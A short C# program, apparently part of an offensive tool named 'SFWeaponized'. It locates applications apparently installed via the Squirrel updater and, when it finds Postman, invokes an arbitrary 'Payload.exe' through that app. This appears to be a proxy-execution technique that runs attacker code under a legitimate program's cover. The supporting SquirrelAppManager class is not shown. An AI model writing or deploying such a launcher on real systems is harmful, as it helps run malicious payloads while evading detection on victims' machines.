using System;

namespace SFWeaponized
{
    internal class Program
    {
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static SquirrelAppManager SquirrelAppManager;

        static void Main(string[] args)
        {
            SquirrelAppManager = new SquirrelAppManager("Payload.exe");
            SquirrelAppManager.StartSearch();

            foreach (var app in SquirrelAppManager.AppList)
            {
                if (app.Name == "Postman")
                {
                    app.Invoke("Payload.exe");
                }
            }
        }
    }
}
